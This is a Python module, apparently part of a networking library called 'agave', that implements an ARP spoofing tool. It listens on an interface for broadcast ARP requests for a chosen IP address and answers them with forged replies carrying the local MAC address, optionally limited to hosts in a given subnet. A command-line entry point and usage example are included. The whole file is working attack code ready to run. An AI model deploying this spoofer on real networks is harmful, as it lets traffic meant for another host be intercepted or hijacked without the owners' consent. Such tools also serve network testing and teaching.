"""ARP spoofing.

This module provides a script to "pretend" to have a certain IP
address assigned by replying to broadcast ARP request with spoofed
responses.

Usage:
	python3 -m agave.arp.pretend <to_have_ip> [for_subnet] [interface]

Example:
	python3 -m agave.arp.pretend 192.168.1.10 192.168.1.5/32 eth0

"""
from typing import Tuple, Union
from agave.core import ethernet, arp
from agave.nic.interfaces import NetworkInterface
from .utils import ARPReaderLoop
from ipaddress import IPv4Address, IPv4Network


class Pretend(ARPReaderLoop):
	"""Service to send spoofed replies in response of
		broadcast requests.

	"""
	def __init__(
		self,
		to_be: Union[IPv4Address, str],
		for_subnet: Union[IPv4Network, str] = None,
		interface: Union[NetworkInterface, str] = None
	):
		"""
		Args:
			to_be: IP address to pretend to be.
			for_subnet: subnet of host for which to pretend,
				default to any.
			interface: interface where to receive the data,
				default to the one directly connected to a
				subnet including <to_be> host.

		"""
		super().__init__(selector_timeout=1)
		# Initialize arguments
		if type(to_be) == str:
			to_be = IPv4Address(to_be)
		if type(for_subnet) == str:
			for_subnet = IPv4Network(for_subnet)
		if type(interface) is str:
			interface = NetworkInterface.get_by_name(interface)
		if for_subnet is None:
			for_subnet = IPv4Network("0.0.0.0/0")
		if interface is None:
			interface = NetworkInterface.get_by_host(to_be)
		# Initialize attributes
		self._address = (interface.name, ethernet.ETHER_TYPE_ARP)
		self._mac = interface.mac.address
		self._to_be = to_be.packed
		self._for_subnet = for_subnet

	def process(self, address: Tuple, eth: ethernet.Ethernet, frame: arp.ARP):
		"""Sends back a reply when a request for the target IP address is
		sent by an host in the target subnet.
		"""
		if ( 
			frame.operation == arp.OPERATION_REQUEST and
			frame.target_protocol_address == self._to_be and
			IPv4Address(frame.sender_protocol_address) in self._for_subnet
		):
			data = frame.reply(self._mac)
			self._sock.sendto(data, self._address)


if __name__ == "__main__":
	
	import sys
	from agave.nic.interfaces import NetworkInterfaceNotFound

	
	try:
		print("Pretending...")
		subnet = sys.argv[2] if len(sys.argv) > 2 else None
		interface = sys.argv[3] if len(sys.argv) > 3 else None
		Pretend(sys.argv[1], for_subnet=subnet, interface=interface).run()
	except NetworkInterfaceNotFound as e:
		print(e)
	except KeyboardInterrupt as e:
		pass
